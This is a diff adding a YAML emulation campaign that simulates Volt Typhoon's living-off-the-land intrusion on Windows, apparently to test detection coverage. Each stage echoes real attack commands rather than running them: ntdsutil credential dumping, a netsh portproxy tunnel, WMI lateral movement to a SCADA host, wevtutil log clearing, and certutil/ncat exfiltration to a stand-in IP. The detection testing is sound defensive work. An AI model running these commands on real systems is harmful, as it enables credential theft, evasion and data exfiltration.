@@ -1,0 +1,262 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: volt-typhoon
+  adversary: Volt Typhoon
+  description: "Volt Typhoon (PRC state-sponsored) living-off-the-land intrusion targeting US critical infrastructure — uses only built-in Windows tools with zero custom malware"
+  objective: "Validate detection coverage against LOTL techniques that evade signature-based tools by abusing native OS binaries"
+  mitre_version: "15.1"
+  severity: high
+  tags: [apt, nation-state, china, prc, lotl, critical-infrastructure, living-off-the-land]
+  authors: ["ThreatEcho"]
+  references:
+    - https://attack.mitre.org/groups/G1017/
+    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a
+  created: "2025-01-10"
+  modified: "2025-09-01"
+
+variables:
+  target_domain: "energy.corp.local"
+  dc_host: "DC01"
+  proxy_port: "8443"
+  tunnel_endpoint: "198.51.100.50"
+  vpn_appliance: "vpn-gw01.energy.corp.local"
+
+stages:
+  - id: exploit-public-facing
+    name: Exploit Public-Facing VPN Appliance
+    description: "Volt Typhoon exploits known vulnerabilities in internet-facing network appliances (Fortinet, Ivanti, Citrix) to gain initial foothold without phishing"
+    technique: T1190
+    tactic: initial-access
+    platform: [windows]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Exploiting CVE on {{vpn_appliance}} — authentication bypass on VPN management interface"'
+        - 'echo "[SIM] Web shell planted via path traversal on appliance filesystem"'
+    expect:
+      telemetry: [network_connection, process_create]
+      detections: [exploit_public_facing_application, suspicious_vpn_appliance_activity]
+    on_success: valid-account-access
+    on_failure: abort
+    timeout: 120s
+
+  - id: valid-account-access
+    name: Valid Account Authentication
+    description: "Authenticate to internal systems using credentials harvested from the compromised appliance — Volt Typhoon avoids creating new accounts"
+    technique: T1078
+    tactic: initial-access
+    platform: [windows]
+    depends_on: [exploit-public-facing]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Authenticating to {{dc_host}}.{{target_domain}} with harvested VPN admin credentials"'
+        - 'echo "[SIM] RDP session established using legitimate domain account"'
+    expect:
+      telemetry: [logon_event, authentication, network_connection]
+      detections: [anomalous_logon_source, vpn_credential_reuse, unusual_admin_logon]
+    on_success: system-discovery
+    on_failure: abort
+    timeout: 60s
+
+  - id: system-discovery
+    name: System Information Enumeration
+    description: "Enumerate local system using only built-in Windows commands — systeminfo, hostname, ver — Volt Typhoon avoids deploying any recon tools"
+    technique: T1082
+    tactic: discovery
+    platform: [windows]
+    depends_on: [valid-account-access]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] systeminfo"'
+        - 'echo "[SIM] hostname"'
+        - 'echo "[SIM] ver"'
+        - 'echo "[SIM] wmic os get caption,version,buildnumber"'
+      elevated: false
+    expect:
+      telemetry: [process_create]
+      detections: [system_info_discovery_commands, wmic_reconnaissance]
+    on_success: network-discovery
+    on_failure: continue
+    timeout: 30s
+
+  - id: network-discovery
+    name: Network Configuration Discovery
+    description: "Map network topology using ipconfig, netstat, route, arp — pure LOLBin reconnaissance to identify lateral movement targets"
+    technique: T1016
+    tactic: discovery
+    platform: [windows]
+    depends_on: [system-discovery]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] ipconfig /all"'
+        - 'echo "[SIM] netstat -ano"'
+        - 'echo "[SIM] route print"'
+        - 'echo "[SIM] arp -a"'
+      elevated: false
+    expect:
+      telemetry: [process_create]
+      detections: [network_config_discovery_sequence, rapid_net_enumeration]
+    on_success: domain-discovery
+    on_failure: continue
+    timeout: 30s
+
+  - id: domain-discovery
+    name: Domain Account and Trust Enumeration
+    description: "Enumerate domain accounts, groups, and trust relationships using net, nltest, and wmic — all native to Windows"
+    technique: T1087.002
+    tactic: discovery
+    platform: [windows]
+    depends_on: [network-discovery]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] net group \"Domain Admins\" /domain"'
+        - 'echo "[SIM] net group \"Enterprise Admins\" /domain"'
+        - 'echo "[SIM] nltest /dclist:{{target_domain}}"'
+        - 'echo "[SIM] nltest /domain_trusts /all_trusts"'
+        - 'echo "[SIM] wmic useraccount list brief"'
+      elevated: false
+    expect:
+      telemetry: [process_create]
+      detections: [domain_enumeration_commands, nltest_domain_trust_discovery, suspicious_ad_enumeration]
+    on_success: credential-ntds
+    on_failure: continue
+    timeout: 45s
+
+  - id: credential-ntds
+    name: NTDS.dit Credential Extraction
+    description: "Extract domain credentials via ntdsutil or volume shadow copy — Volt Typhoon targets the AD database rather than LSASS to avoid EDR hooks"
+    technique: T1003.003
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [domain-discovery]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] ntdsutil \"activate instance ntds\" ifm \"create full C:\\Windows\\Temp\\ntds\" quit quit"'
+        - 'echo "[SIM] NTDS.dit and SYSTEM hive copied to staging directory"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] Removing NTDS staging directory"'
+    expect:
+      telemetry: [process_create, file_create]
+      detections: [ntdsutil_abuse, ntds_dit_access, volume_shadow_copy_suspicious]
+      artifacts: ["C:\\Windows\\Temp\\ntds\\"]
+    on_success: proxy-tunneling
+    on_failure: continue
+    timeout: 120s
+
+  - id: proxy-tunneling
+    name: Protocol Tunneling for C2
+    description: "Establish covert C2 via netsh portproxy — Volt Typhoon tunnels traffic through compromised infrastructure instead of using standard implant beacons"
+    technique: T1572
+    tactic: command-and-control
+    platform: [windows]
+    depends_on: [valid-account-access]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] netsh interface portproxy add v4tov4 listenport={{proxy_port}} listenaddress=0.0.0.0 connectport=443 connectaddress={{tunnel_endpoint}}"'
+        - 'echo "[SIM] Port proxy established — traffic tunneled through compromised host to external endpoint"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] netsh interface portproxy delete v4tov4 listenport={{proxy_port}} listenaddress=0.0.0.0"'
+    expect:
+      telemetry: [process_create, network_connection, registry_set]
+      detections: [netsh_port_proxy_creation, suspicious_portproxy_rule, lotl_tunneling_activity]
+      iocs: ["{{tunnel_endpoint}}"]
+    on_success: lateral-movement-wmi
+    on_failure: abort
+    timeout: 60s
+
+  - id: lateral-movement-wmi
+    name: Lateral Movement via WMI
+    description: "Move laterally using wmic process call create — native Windows tool avoids transferring any executable to the target"
+    technique: T1047
+    tactic: execution
+    platform: [windows]
+    depends_on: [credential-ntds, proxy-tunneling]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] wmic /node:\"SCADA-SRV01\" /user:\"{{target_domain}}\\svc-admin\" process call create \"cmd.exe /c systeminfo > C:\\Windows\\Temp\\out.txt\""'
+        - 'echo "[SIM] Remote command executed on critical infrastructure host via WMI"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] Removing remote output files"'
+    expect:
+      telemetry: [process_create, network_connection, authentication]
+      detections: [wmic_remote_process_creation, lateral_movement_via_wmi, remote_wmi_execution]
+      iocs: ["SCADA-SRV01"]
+    on_success: defense-evasion-logs
+    on_failure: continue
+    timeout: 60s
+
+  - id: defense-evasion-logs
+    name: Clear Windows Event Logs
+    description: "Clear Security and System event logs using wevtutil — standard Volt Typhoon anti-forensics using only built-in tools"
+    technique: T1070.001
+    tactic: defense-evasion
+    platform: [windows]
+    depends_on: [lateral-movement-wmi]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] wevtutil cl Security"'
+        - 'echo "[SIM] wevtutil cl System"'
+        - 'echo "[SIM] wevtutil cl Microsoft-Windows-PowerShell/Operational"'
+      elevated: true
+    expect:
+      telemetry: [process_create, log_clear]
+      detections: [security_log_cleared, event_log_manipulation, wevtutil_log_clear]
+    on_success: data-collection
+    on_failure: continue
+    timeout: 30s
+
+  - id: data-collection
+    name: Collect Sensitive OT Configuration Data
+    description: "Stage sensitive files from critical infrastructure systems — targeting OT documentation, network diagrams, and SCADA configurations"
+    technique: T1005
+    tactic: collection
+    platform: [windows]
+    depends_on: [defense-evasion-logs]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] dir /s /b C:\\Users\\*.pdf C:\\Users\\*.docx C:\\Users\\*.xlsx > C:\\Windows\\Temp\\filelist.txt"'
+        - 'echo "[SIM] makecab C:\\Windows\\Temp\\filelist.txt C:\\Windows\\Temp\\data.cab"'
+      elevated: false
+    expect:
+      telemetry: [process_create, file_create, file_read]
+      detections: [mass_file_enumeration, data_staging_in_temp, sensitive_file_access]
+      artifacts: ["C:\\Windows\\Temp\\data.cab"]
+    on_success: exfiltration-tunnel
+    on_failure: continue
+    timeout: 90s
+
+  - id: exfiltration-tunnel
+    name: Exfiltration via Protocol Tunneling
+    description: "Exfiltrate staged data through the established netsh portproxy tunnel — no external tools, no standard exfil channels"
+    technique: T1048
+    tactic: exfiltration
+    platform: [windows]
+    depends_on: [data-collection, proxy-tunneling]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Exfiltrating data.cab through port proxy tunnel to {{tunnel_endpoint}}"'
+        - 'echo "[SIM] certutil -encode C:\\Windows\\Temp\\data.cab C:\\Windows\\Temp\\data.b64 && type C:\\Windows\\Temp\\data.b64 | ncat {{tunnel_endpoint}} {{proxy_port}}"'
+      elevated: false
+      cleanup:
+        - 'echo "[SIM] del /f /q C:\\Windows\\Temp\\data.cab C:\\Windows\\Temp\\data.b64"'
+    expect:
+      telemetry: [process_create, network_connection, file_read]
+      detections: [exfiltration_over_tunnel, certutil_encode_abuse, unusual_outbound_data_transfer]
+      iocs: ["{{tunnel_endpoint}}"]
+    on_failure: abort
+    timeout: 180s
